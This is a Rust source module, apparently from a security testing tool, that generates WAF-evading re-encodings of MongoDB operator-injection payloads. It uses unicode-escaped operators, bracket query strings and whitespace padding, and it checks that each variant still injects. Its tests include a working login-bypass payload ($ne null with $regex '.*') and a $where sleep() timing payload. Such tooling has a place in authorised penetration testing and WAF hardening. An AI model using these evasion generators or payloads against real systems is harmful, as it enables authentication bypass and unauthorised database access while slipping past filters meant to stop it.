//! NoSQL (MongoDB operator-injection) payload-string equivalence + the
//! joint `(payload × delivery)` generator — the nosql arm of Phase B.
//!
//! The sound equivalence is **operator-encoding equivalence**: the
//! `(param, $operator, operand)` triple a Mongo query is built from is
//! reconstructed identically by the server whether it arrives as a
//! JSON body, a bracketed query string (`user[$ne]=`, Express/`qs`),
//! whitespace-padded JSON, or with the operator's `$`/letters written
//! as RFC 8259 `\uXXXX` escapes (`$ne` IS `$ne` to every JSON
//! parser). A WAF regex keyed on the literal `$ne` / `$where` / `$gt`
//! matches none of the re-encodings; the driver sees the same query.
//!
//! Anti-rig: the *operator* and the *operand* are preserved verbatim
//! and re-verified ([`still_injects`]). `$ne`→`$gt`, or changing the
//! operand, is a DIFFERENT query and is rejected — the equivalence is
//! purely in the transport/whitespace/JSON-escape encoding, never
//! "any `$op` is fine".

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};

const MONGO_OPS: &[&str] = &[
    "$ne", "$gt", "$gte", "$lt", "$lte", "$in", "$nin", "$regex", "$where", "$exists", "$or",
    "$and", "$not", "$expr", "$elemMatch",
];

/// Decode JSON `\uXXXX` escapes (so `$ne` → `$ne`), then strip
/// insignificant JSON/structural whitespace and lowercase — the view
/// in which all sound re-encodings of one query coincide.
fn decode_unicode(s: &str) -> String {
    let b: Vec<char> = s.chars().collect();
    let mut o = String::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == '\\' && i + 5 < b.len() && (b[i + 1] == 'u' || b[i + 1] == 'U') {
            let h: String = b[i + 2..i + 6].iter().collect();
            if let Some(c) = u32::from_str_radix(&h, 16).ok().and_then(char::from_u32) {
                o.push(c);
                i += 6;
                continue;
            }
        }
        o.push(b[i]);
        i += 1;
    }
    o
}

/// Canonical view: every Mongo `$operator` that appears, paired with
/// its operand value read verbatim up to the enclosing structural
/// terminator (so `sleep(1)` ≠ `sleep(9)` survives), in first-seen
/// order — independent of JSON vs bracket vs dotted encoding and of
/// insignificant whitespace.
fn canon(s: &str) -> Vec<(String, String)> {
    let d = decode_unicode(s).to_ascii_lowercase();
    let b: Vec<char> = d.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] != '$' {
            i += 1;
            continue;
        }
        // operator token = `$` + letters; must be a known Mongo op and
        // not a longer identifier (`$nexus` is not `$ne`).
        let mut j = i + 1;
        while j < b.len() && b[j].is_ascii_alphabetic() {
            j += 1;
        }
        let op: String = b[i..j].iter().collect();
        if !MONGO_OPS.contains(&op.as_str()) {
            i = j.max(i + 1);
            continue;
        }
        // advance to the key→value separator (`:` JSON, `=` bracket),
        // tolerating the closing key-quote / `]` and whitespace.
        let mut k = j;
        while k < b.len() && b[k] != ':' && b[k] != '=' && b[k] != ',' && b[k] != '}' {
            k += 1;
        }
        if k >= b.len() || (b[k] != ':' && b[k] != '=') {
            i = j.max(i + 1);
            continue;
        }
        k += 1; // past the separator
        while k < b.len() && matches!(b[k], ' ' | '\t' | '\n' | '\r') {
            k += 1;
        }
        let mut operand = String::new();
        if k < b.len() && (b[k] == '"' || b[k] == '\'') {
            // quoted string value — content up to the matching quote
            let q = b[k];
            k += 1;
            while k < b.len() && b[k] != q {
                operand.push(b[k]);
                k += 1;
            }
            k += 1;
        } else if k < b.len() && matches!(b[k], '{' | '[' | '(') {
            // balanced structured value, delimiters included
            let mut depth = 0i32;
            while k < b.len() {
                let c = b[k];
                match c {
                    '{' | '[' | '(' => depth += 1,
                    '}' | ']' | ')' => depth -= 1,
                    _ => {}
                }
                operand.push(c);
                k += 1;
                if depth == 0 {
                    break;
                }
            }
        } else {
            // bare scalar — until the next structural terminator
            while k < b.len() && !matches!(b[k], ',' | '&' | '}' | ']' | ' ') {
                operand.push(b[k]);
                k += 1;
            }
        }
        out.push((op, operand.trim().to_string()));
        i = k.max(i + 1);
    }
    out
}

/// True iff `cand` expresses the SAME Mongo operator-injection (same
/// set/sequence of `(operator, operand)` pairs) as `original`.
#[must_use]
pub fn still_injects(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() {
        return false;
    }
    let co = canon(original);
    if co.is_empty() {
        return false;
    }
    canon(cand) == co
}

// ── rewrites (parser-transparent, WAF-opaque) ──────────────────────

/// JSON-escape selected characters of the operator as `\uXXXX`
/// (RFC 8259 — semantically identical to a JSON parser).
fn rw_unicode_escape(s: &str, rng: &mut Rng) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    let mut after_dollar = false;
    for ch in s.chars() {
        let is_opchar = ch == '$' || (after_dollar && ch.is_ascii_alphabetic());
        after_dollar = ch == '$' || (after_dollar && ch.is_ascii_alphabetic());
        if is_opchar && ch.is_ascii() && rng.chance(3, 5) {
            out.push_str(&format!("\\u{:04x}", ch as u32));
        } else {
            out.push(ch);
        }
    }
    out
}

/// Re-encode a JSON operator body as the equivalent bracketed
/// query-string form: `{"p":{"$ne":"x"}}` → `p[$ne]=x` (Express/`qs`
/// parse this back to the identical document).
fn rw_to_bracket(s: &str) -> Option<String> {
    let pairs = canon(s);
    if pairs.is_empty() {
        return None;
    }
    // best-effort param name: the bare token right before the first
    // `{`/`[`; fall back to `q`.
    let param = s
        .split(['{', '['])
        .next()
        .map(|p| {
            p.trim()
                .trim_matches(['"', '\'', ':', '=', ' ', '?', '&'])
                .to_string()
        })
        .filter(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or_else(|| "q".to_string());
    let mut q = String::new();
    for (i, (op, val)) in pairs.iter().enumerate() {
        if i > 0 {
            q.push('&');
        }
        q.push_str(&format!("{param}[{op}]={val}"));
    }
    Some(q)
}

/// Whitespace-pad a JSON operator payload (insignificant per RFC 8259).
fn rw_json_ws(s: &str, rng: &mut Rng) -> String {
    let ws = *rng.pick(&[" ", "\t", "\n", "  ", " \t "]);
    s.replace(':', &format!("{ws}:{ws}"))
        .replace(',', &format!("{ws},{ws}"))
}

#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let all = super::sql::delivery_set(&cfg.param);
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all.len() => (vec![all[i].clone()], true),
        _ => (all, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    if !still_injects(payload, payload) {
        return out;
    }

    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut s = payload.to_string();
        let mut rules: Vec<&'static str> = Vec::new();
        if rng.chance(1, 2) {
            if let Some(b) = rw_to_bracket(&s) {
                if b != s {
                    s = b;
                    rules.push("json_to_bracket");
                }
            }
        }
        if !rules.contains(&"json_to_bracket") && rng.chance(1, 2) {
            let n = rw_json_ws(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("json_whitespace");
            }
        }
        if rng.chance(3, 5) {
            let n = rw_unicode_escape(&s, &mut rng);
            if n != s {
                s = n;
                rules.push("json_unicode_escape");
            }
        }
        if rules.is_empty() {
            continue;
        }
        if !still_injects(payload, &s) {
            continue;
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{s}\u{1}{}", d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: s,
            delivery: d,
            dialect: Dialect::Generic,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg(seed: u64) -> EquivConfig {
        EquivConfig {
            seed,
            max: 40,
            verify: true,
            vary_delivery: true,
            param: "username".into(),
            force_delivery: None,
        }
    }

    #[test]
    fn json_unicode_bracket_all_canonicalise_identically() {
        let base = r#"{"username":{"$ne":"x"}}"#;
        for v in [
            r#"{"username":{"$ne":"x"}}"#,
            r#"{ "username" : { "$ne" : "x" } }"#,
            r#"{"username":{"$ne":"x"}}"#,
            "username[$ne]=x",
        ] {
            assert!(still_injects(base, v), "not equiv: {v}");
        }
        assert_eq!(canon(base), vec![("$ne".into(), "x".into())]);
        assert_eq!(canon(r#"{"$ne":"x"}"#), vec![("$ne".into(), "x".into())]);
    }

    #[test]
    fn operator_or_operand_swap_is_rejected() {
        assert!(!still_injects(r#"{"$ne":"x"}"#, r#"{"$gt":"x"}"#)); // diff op
        assert!(!still_injects(r#"{"$ne":"x"}"#, r#"{"$ne":"y"}"#)); // diff operand
        assert!(!still_injects(r#"{"$where":"sleep(1)"}"#, r#"{"$where":"sleep(9)"}"#));
    }

    #[test]
    fn non_nosql_and_empty_emit_nothing() {
        assert!(generate("", &cfg(1)).is_empty());
        assert!(generate("alice", &cfg(1)).is_empty());
        assert!(generate(r#"{"user":"bob"}"#, &cfg(1)).is_empty()); // no $op
    }

    #[test]
    fn deterministic_diverse_and_all_sound() {
        let atk = r#"{"username":{"$ne":null},"pw":{"$regex":".*"}}"#;
        let a: Vec<_> = generate(atk, &cfg(5)).into_iter().map(|m| m.payload).collect();
        let b: Vec<_> = generate(atk, &cfg(5)).into_iter().map(|m| m.payload).collect();
        assert_eq!(a, b);
        assert!(a.iter().collect::<std::collections::HashSet<_>>().len() >= 5);
        for seed in 0..30u64 {
            for m in generate(atk, &cfg(seed)) {
                assert!(still_injects(atk, &m.payload), "UNSOUND {:?}", m.payload);
            }
        }
    }
}
